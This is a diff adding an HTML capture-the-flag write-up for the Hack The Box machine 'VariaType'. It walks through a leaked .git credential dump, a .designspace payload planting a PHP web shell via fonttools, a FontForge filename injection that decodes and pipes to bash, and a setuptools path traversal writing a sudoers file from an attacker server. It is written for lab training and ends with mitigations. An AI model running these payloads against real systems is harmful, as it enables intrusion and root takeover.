@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VariaType Writeup | Koussay Aydi</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <canvas id="particles-canvas"></canvas>
+    <div class="scroll-progress" id="scrollProgress"></div>
+    <div class="cursor-ring" id="cursorRing"></div>
+    <header class="topbar">
+        <div class="brand">
+            <div class="brand-mark">KA</div>
+            <div class="brand-info">
+                <p class="brand-label">Koussay Aydi</p>
+                <span class="brand-subtitle">Red Team Writeup</span>
+            </div>
+        </div>
+        <nav class="main-nav">
+            <a href="index.html">Back to Portfolio</a>
+        </nav>
+        <div class="topbar-actions">
+            <button id="mobileMenuBtn" class="icon-btn mobile-menu-btn" aria-label="Open mobile menu"><i class="fas fa-bars"></i></button>
+        </div>
+    </header>
+    <div class="mobile-nav" id="mobileNav" aria-hidden="true">
+        <a href="index.html">Back to Portfolio</a>
+    </div>
+    <main class="page-shell">
+        <article class="panel writeup-content">
+            <span class="eyebrow">Hack The Box — Linux Medium</span>
+            <h1>VariaType Writeup</h1>
+            <p><strong>Author:</strong> Atrox | <strong>Difficulty:</strong> Medium | <strong>Date:</strong> March 2026</p>
+            <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
+
+            <h2>Machine Information</h2>
+            <table>
+                <thead><tr><th>Field</th><th>Value</th></tr></thead>
+                <tbody>
+                    <tr><td>Target IP</td><td>10.129.9.14</td></tr>
+                    <tr><td>OS</td><td>Linux (Debian), nginx/1.22.1</td></tr>
+                    <tr><td>Hostname</td><td>variatype.htb / portal.variatype.htb</td></tr>
+                    <tr><td>Services</td><td>22 (SSH), 80 (HTTP)</td></tr>
+                </tbody>
+            </table>
+
+            <h2>Attack Chain Overview</h2>
+            <div class="attack-chain">
+                <pre><code>Recon → Exposed .git → Credentials Leak
+            ↓
+Portal Login → CVE-2025-66034 (fonttools RCE)
+            ↓
+www-data Shell → CVE-2024-25081 (FontForge Injection)
+            ↓
+steve Shell → CVE-2025-47273 (setuptools Privesc)
+            ↓
+ROOT ACCESS</code></pre>
+            </div>
+
+            <h2>1. Reconnaissance</h2>
+            <p>Scanning the target reveals a web server with two virtual hosts:</p>
+            <pre><code>echo "10.129.9.14 variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
+nmap -sC -sV -oN nmap.txt 10.129.9.14</code></pre>
+            <ul>
+                <li><code>variatype.htb</code>: Flask application for font generation.</li>
+                <li><code>portal.variatype.htb</code>: Internal PHP validation portal.</li>
+            </ul>
+            <p>Web enumeration on the portal subdomain reveals an exposed <code>.git</code> directory, which is a critical configuration error.</p>
+
+            <h2>2. Credential Discovery (Git Leak)</h2>
+            <p>Using <code>git-dumper</code>, we recover the repository. Even though a later commit tried to remove them, the history still contains the credentials in <code>auth.php</code>.</p>
+            <pre><code>git-dumper http://portal.variatype.htb/.git /tmp/gitdump
+cd /tmp/gitdump
+git log --oneline
+git show 6f021da</code></pre>
+            <p><strong>Credentials Found:</strong> <code>gitbot : G1tB0t_Acc3ss_2025!</code></p>
+            <p>Logging into the portal (<code>http://portal.variatype.htb</code>) grants access to the internal dashboard.</p>
+
+            <h2>3. Initial Foothold (CVE-2025-66034)</h2>
+            <p>The font generator uses <code>fonttools</code>, which is vulnerable to arbitrary file write via the <code>filename</code> attribute in <code>.designspace</code> files. We can also inject PHP code via CDATA tags in the <code>labelname</code> element.</p>
+            
+            <h3>3.1 Generating Base Fonts</h3>
+            <pre><code class="language-python"># setup.py to generate valid source TTF files
+from fontTools.fontBuilder import FontBuilder
+from fontTools.pens.ttGlyphPen import TTGlyphPen
+
+def create_source_font(filename, weight=400):
+    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
+    fb.setupGlyphOrder([".notdef"])
+    fb.setupCharacterMap({})
+    pen = TTGlyphPen(None)
+    pen.moveTo((0, 0)); pen.lineTo((500, 0))
+    pen.lineTo((500, 500)); pen.lineTo((0, 500))
+    pen.closePath()
+    fb.setupGlyf({".notdef": pen.glyph()})
+    fb.setupHorizontalMetrics({".notdef": (500, 0)})
+    fb.setupHorizontalHeader(ascent=800, descent=-200)
+    fb.setupOS2(usWeightClass=weight)
+    fb.setupPost()
+    fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})
+    fb.save(filename)
+
+create_source_font("source-light.ttf", weight=100)
+create_source_font("source-regular.ttf", weight=400)</code></pre>
+
+            <h3>3.2 Malicious .designspace Payload</h3>
+            <pre><code class="language-xml">&lt;?xml version='1.0' encoding='UTF-8'?&gt;
+&lt;designspace format="5.0"&gt;
+  &lt;axes&gt;
+    &lt;axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"&gt;
+      &lt;labelname xml:lang="en"&gt;&lt;![CDATA[&lt;?php system($_GET["cmd"]); ?&gt;]]&gt;&lt;/labelname&gt;
+    &lt;/axis&gt;
+  &lt;/axes&gt;
+  &lt;sources&gt;
+    &lt;source filename="source-light.ttf" name="Light"&gt;
+      &lt;location&gt;&lt;dimension name="Weight" xvalue="100"/&gt;&lt;/location&gt;
+    &lt;/source&gt;
+    &lt;source filename="source-regular.ttf" name="Regular"&gt;
+      &lt;location&gt;&lt;dimension name="Weight" xvalue="400"/&gt;&lt;/location&gt;
+    &lt;/source&gt;
+  &lt;/sources&gt;
+  &lt;variable-fonts&gt;
+    &lt;variable-font name="Shell" filename="/var/www/portal.variatype.htb/public/files/shell.php"&gt;
+      &lt;axis-subsets&gt;&lt;axis-subset name="Weight"/&gt;&lt;/axis-subsets&gt;
+    &lt;/variable-font&gt;
+  &lt;/variable-fonts&gt;
+&lt;/designspace&gt;</code></pre>
+            <p>Uploading these files to <code>variatype.htb/tools/variable-font-generator</code> creates <code>shell.php</code>. Accessing it with <code>cmd=id</code> confirms RCE as <code>www-data</code>.</p>
+
+            <h2>4. Lateral Movement (CVE-2024-25081)</h2>
+            <p>The user <code>steve</code> runs a cleanup script via cron that uses <code>FontForge</code> to process font files. FontForge is vulnerable to command injection when opening filenames containing <code>$(command)</code>.</p>
+            <p>We bypass the filename character filter by placing the malicious filename inside a ZIP archive.</p>
+            <pre><code class="language-python">filename = '$(echo ' + b64_payload + '|base64 -d|bash).ttf'
+with zipfile.ZipFile('exploit.zip', 'w') as z:
+    z.writestr(filename, 'dummy')</code></pre>
+            <p>Transferring <code>exploit.zip</code> to <code>/var/www/portal.variatype.htb/public/files/</code> and waiting for the cronjob yields a shell as <code>steve</code>.</p>
+
+            <h2>5. Privilege Escalation (CVE-2025-47273)</h2>
+            <p>Checking sudo permissions shows steve can run a specific Python script as root:</p>
+            <pre><code>sudo -l
+# (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *</code></pre>
+            <p>The script uses an older version of <code>setuptools</code> with a path traversal vulnerability in its URL downloader. By URL-encoding slashes (<code>%2F</code>), we can write a file to an arbitrary location.</p>
+            
+            <h3>5.1 Malicious Server</h3>
+            <p>On Kali, we host a file that gives steve full sudo rights:</p>
+            <pre><code>echo "steve ALL=(ALL) NOPASSWD: ALL" > authorized_keys
+python3 -m http.server 9999</code></pre>
+
+            <h3>5.2 Exploitation</h3>
+            <pre><code>sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+  "http://&lt;KALI_IP&gt;:9999/%2Fetc%2Fsudoers.d%2Fsteve"</code></pre>
+            <p>With the new sudoers file in place, we simply run <code>sudo su -</code> to get root access.</p>
+
+            <h2>Flags</h2>
+            <table>
+                <thead><tr><th>Flag</th><th>Value</th></tr></thead>
+                <tbody>
+                    <tr><td>user.txt</td><td>**************************</td></tr>
+                    <tr><td>root.txt</td><td>**************************</td></tr>
+                </tbody>
+            </table>
+
+            <h2>Vulnerability Summary</h2>
+            <table>
+                <thead><tr><th>CVE</th><th>Component</th><th>Impact</th></tr></thead>
+                <tbody>
+                    <tr><td>CVE-2025-66034</td><td>fonttools</td><td>RCE via Arbitrary File Write</td></tr>
+                    <tr><td>CVE-2024-25081</td><td>FontForge</td><td>Command Injection</td></tr>
+                    <tr><td>CVE-2025-47273</td><td>setuptools</td><td>Root Path Traversal</td></tr>
+                </tbody>
+            </table>
+
+            <h2>Mitigations</h2>
+            <ul>
+                <li><strong>Web Security:</strong> Block access to <code>.git</code> directories in production using nginx/Apache rules.</li>
+                <li><strong>Credential Management:</strong> Never store hardcoded passwords in source code. Rotate leaked credentials immediately.</li>
+                <li><strong>Patching:</strong> Upgrade <code>fonttools</code>, <code>FontForge</code>, and <code>setuptools</code> to the latest patched versions.</li>
+                <li><strong>Least Privilege:</strong> Avoid using wildcards (<code>*</code>) in <code>sudoers</code> entries.</li>
+            </ul>
+
+            <h2>Tools Used</h2>
+            <div class="hero-meta" style="background: none; border: none; padding: 0;">
+                <code>nmap</code> 
+                <code>git-dumper</code> 
+                <code>fonttools</code> 
+                <code>python3</code> 
+                <code>netcat</code> 
+                <code>curl</code>
+            </div>
+
+            <div style="margin-top: 50px; text-align: center;">
+                <a href="index.html" class="btn btn-primary"><i class="fas fa-arrow-left"></i> Return Home</a>
+            </div>
+        </article>
+    </main>
+    <script src="script.js" defer></script>
+</body>
+</html>
